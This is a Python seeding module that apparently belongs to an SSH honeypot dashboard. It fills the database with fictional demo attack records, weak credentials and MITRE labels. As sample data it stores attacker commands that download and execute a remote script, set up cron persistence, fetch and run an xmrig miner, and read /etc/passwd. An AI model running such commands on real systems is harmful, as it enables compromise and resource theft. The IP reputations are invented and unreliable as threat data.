"""Demo / placeholder data seeding.

Generates a realistic, varied dataset so the dashboard looks compelling for
screenshots and recruiter demos even before any real attacks arrive. Rows are
inserted directly (not via the pipeline) so geolocation/labels are populated
without needing the GeoLite2 databases.
"""
from __future__ import annotations

import json
import logging
import random
from datetime import datetime, timedelta, timezone

from core.db import session_scope
from core.models import Attack, Command, Incident
from core.models.incident import IncidentStatus

logger = logging.getLogger("sentinelssh.demo")

# (ip, country) with realistic threat-source geographies.
_SOURCES = [
    ("185.220.100.5", "Russia", "AS205100", "FlokiNET"),
    ("45.95.147.20", "Netherlands", "AS202425", "IP Volume inc"),
    ("103.97.176.10", "China", "AS4837", "China Unicom"),
    ("191.96.227.8", "Brazil", "AS262287", "Latitude.sh"),
    ("196.196.150.3", "South Africa", "AS37153", "Xneelo"),
    ("8.8.8.8", "United States", "AS15169", "Google LLC"),
    ("212.70.149.71", "Bulgaria", "AS9009", "M247"),
]
_USERNAMES = ["root", "admin", "ubuntu", "postgres", "test", "oracle", "git", "pi"]
_PASSWORDS = ["123456", "admin", "password", "root", "12345678", "qwerty", "toor", "1234"]
_SSH_VERSIONS = ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-PUTTY", "SSH-2.0-paramiko_2.7.2"]

_PROFILES = [
    # (behaviors, mitre, commands, risk)
    (["common_credential_use", "brute_force", "known_malicious_source", "tool_transfer", "cron_persistence", "post_auth_activity"],
     ["T1078", "T1110", "T1105", "T1053.003", "T1021.004"],
     ["uname -a", "wget http://45.95.147.20/x.sh", "chmod +x x.sh", "./x.sh", "crontab -e"], 96),
    (["common_credential_use", "brute_force", "known_malicious_source", "cryptomining", "post_auth_activity"],
     ["T1078", "T1110", "T1496", "T1021.004"],
     ["curl -O http://pool/xmrig", "./xmrig --donate-level 1"], 91),
    (["common_credential_use", "brute_force", "system_discovery", "user_discovery", "account_discovery", "post_auth_activity"],
     ["T1078", "T1110", "T1082", "T1033", "T1087", "T1021.004"],
     ["whoami", "id", "uname -a", "cat /etc/passwd"], 78),
    (["common_credential_use", "brute_force", "post_auth_activity"],
     ["T1078", "T1110", "T1021.004"],
     ["ls -la", "w"], 52),
    (["common_credential_use", "brute_force"],
     ["T1078", "T1110"], [], 35),
    (["brute_force"], ["T1110"], [], 22),
]


def _risk_level(score: int) -> str:
    if score > 70:
        return "high"
    if score > 30:
        return "medium"
    return "low"


def seed_if_empty(force: bool = False, count: int = 14) -> int:
    """Seed demo data when the attacks table is empty (or force=True).

    Returns the number of attacks created (0 if data already present).
    """
    with session_scope() as session:
        if not force and session.query(Attack).first() is not None:
            return 0

        now = datetime.now(timezone.utc)
        rng = random.Random(42)  # deterministic for reproducible screenshots
        incidents: dict[str, Incident] = {}
        created = 0

        for i in range(count):
            ip, country, asn, isp = rng.choice(_SOURCES)
            profile = _PROFILES[i % len(_PROFILES)]
            behaviors, mitre, cmds, base_risk = profile
            risk = max(0, min(100, base_risk + rng.randint(-4, 4)))
            ts = now - timedelta(minutes=rng.randint(1, 24 * 60))
            is_mal = "known_malicious_source" in behaviors

            incident = incidents.get(ip)
            if incident is None:
                incident = Incident(
                    source_ip=ip, country=country, first_seen=ts, last_seen=ts,
                    attempt_count=0, max_risk_score=0, status=IncidentStatus.OPEN,
                    mitre_techniques=json.dumps([]),
                )
                session.add(incident)
                session.flush()
                incidents[ip] = incident

            attempts = rng.randint(3, 25)
            incident.first_seen = min(incident.first_seen, ts)
            incident.last_seen = max(incident.last_seen, ts)
            incident.attempt_count += attempts
            incident.max_risk_score = max(incident.max_risk_score, risk)
            merged = list(dict.fromkeys(json.loads(incident.mitre_techniques or "[]") + mitre))
            incident.mitre_techniques = json.dumps(merged)
            incident.title = f"SSH activity from {ip} ({country}) — {incident.attempt_count} attempts"

            attack = Attack(
                timestamp=ts, source_ip=ip, source_port=rng.randint(1024, 65535),
                country=country, asn=asn, isp=isp,
                reputation=100 if is_mal else rng.randint(0, 40), is_malicious=is_mal,
                username=rng.choice(_USERNAMES), password=rng.choice(_PASSWORDS),
                ssh_version=rng.choice(_SSH_VERSIONS), session_id=f"demo{i:03d}{rng.randint(1000,9999)}",
                duration=round(rng.uniform(0.5, 8.0), 2), auth_attempts=attempts,
                risk_score=risk, risk_level=_risk_level(risk),
                behaviors=json.dumps(behaviors), mitre_techniques=json.dumps(mitre),
                incident_id=incident.id,
            )
            for j, c in enumerate(cmds):
                ctype = "exec" if j == 0 and rng.random() < 0.2 else "shell"
                attack.commands.append(Command(
                    session_id=attack.session_id,
                    timestamp=ts + timedelta(seconds=j + 1),
                    command=c, command_type=ctype,
                ))
            session.add(attack)
            created += 1

        logger.info("seeded %d demo attacks across %d incidents", created, len(incidents))
        return created
